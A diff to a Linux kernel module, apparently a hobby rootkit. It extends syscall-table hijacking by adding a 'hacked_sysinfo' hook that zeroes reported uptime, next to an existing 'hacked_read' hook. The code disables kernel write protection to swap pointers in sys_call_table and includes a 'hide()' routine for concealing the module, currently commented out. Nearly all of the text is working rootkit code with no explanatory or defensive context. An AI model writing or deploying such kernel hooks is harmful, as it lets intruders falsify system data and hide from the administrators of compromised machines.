@@ -26,9 +26,12 @@ MODULE_VERSION("0.0.1");
 
 void **sys_call_table;
 struct list_head *module_list;
+struct sysinfo *info;
 
 unsigned long read_count = 0;
 asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
+
+asmlinkage int (*original_sysinfo)(struct sysinfo *);
 
 void hide(void)
 {
@@ -74,6 +77,14 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf, size_t count)
     return original_read(fd, buf, count);
 }
 
+asmlinkage int hacked_sysinfo(struct sysinfo *info)
+{
+    original_sysinfo(info);
+    info->uptime = 0;
+
+    return 0;
+}
+
 static int __init lkm_example_init(void) {
     //Don't hide the kernel for now
     //hide();
@@ -82,11 +93,14 @@ static int __init lkm_example_init(void) {
     sys_call_table = find_syscall_table();
     pr_info("Found sys_call_table at %p\n", sys_call_table);
 
-    void **modified_at_address = &sys_call_table[__NR_read];
-    void *modified_function = hacked_read;
+    void **modified_at_address_read = &sys_call_table[__NR_read];
+    void *modified_function_read = hacked_read;
+    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
+    void *modified_function_sysinfo = hacked_sysinfo;
 
     DISABLE_W_PROTECTED_MEMORY
-    original_read = xchg(modified_at_address, modified_function);
+    original_read = xchg(modified_at_address_read, modified_function_read);
+    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
     ENABLE_W_PROTECTED_MEMORY
 
     return 0;
@@ -95,11 +109,14 @@ static int __init lkm_example_init(void) {
 static void __exit lkm_example_exit(void) {
     printk(KERN_INFO "Goodbye, World!\n");
 
-    void **modified_at_address = &sys_call_table[__NR_read];
-    void *modified_function = original_read;
+    void **modified_at_address_read = &sys_call_table[__NR_read];
+    void *modified_function_read = original_read;
+    void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
+    void *modified_function_sysinfo = original_sysinfo;
 
     DISABLE_W_PROTECTED_MEMORY
-    original_read = xchg(modified_at_address, modified_function);
+    original_read = xchg(modified_at_address_read, modified_function_read);
+    original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
     ENABLE_W_PROTECTED_MEMORY
 }
 
